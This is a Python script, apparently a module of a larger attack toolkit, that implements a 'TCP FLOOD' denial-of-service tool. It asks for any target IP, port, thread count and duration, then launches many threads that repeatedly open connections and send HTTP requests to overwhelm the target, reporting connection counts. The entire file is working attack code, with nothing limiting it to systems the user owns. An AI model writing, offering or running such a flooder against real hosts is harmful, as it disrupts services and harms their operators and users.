import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from swarm_core import c, C, banner, ask, pause

import socket
import threading
import time


def run():
    banner("TCP FLOOD")
    host = ask("target ip", "127.0.0.1") or "127.0.0.1"
    port = int(ask("port", "80") or 80)
    threads = int(ask("threads", "100") or 100)
    secs = float(ask("duration (s)", "10") or 10)

    counter = {"conn": 0, "fail": 0}
    stop = threading.Event()
    lock = threading.Lock()

    def worker():
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, port))
                s.send(b"GET / HTTP/1.0\r\nHost: %b\r\n\r\n" % host.encode())
                with lock:
                    counter["conn"] += 1
                s.close()
            except Exception:
                with lock:
                    counter["fail"] += 1

    ts = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    print(c(f"  flooding {host}:{port}  ·  {threads} threads  ·  {secs}s", C.CY))
    for t in ts:
        t.start()
    time.sleep(secs)
    stop.set()
    for t in ts:
        t.join(timeout=2)

    print(c(f"  {counter['conn']} connections  ·  {counter['fail']} failed", C.G))
    pause()


if __name__ == "__main__":
    run()
